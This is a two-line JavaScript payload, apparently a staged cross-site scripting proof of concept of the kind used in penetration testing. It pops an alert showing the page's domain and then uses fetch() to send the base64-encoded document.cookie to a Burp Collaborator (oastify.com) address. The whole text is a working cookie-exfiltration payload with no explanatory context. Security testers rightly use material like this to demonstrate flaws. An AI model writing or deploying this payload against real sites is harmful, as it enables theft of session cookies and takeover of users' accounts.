alert("=== Staged XSS payload executed ===\nDomain: " + document.domain + "\n\nExfiltrating cookies to Burp Collaborator");
fetch(`https://4sxrf2rnnztvp8eltkw5kronue05owhk6.oastify.com/exfil=${btoa(document.cookie)}`)
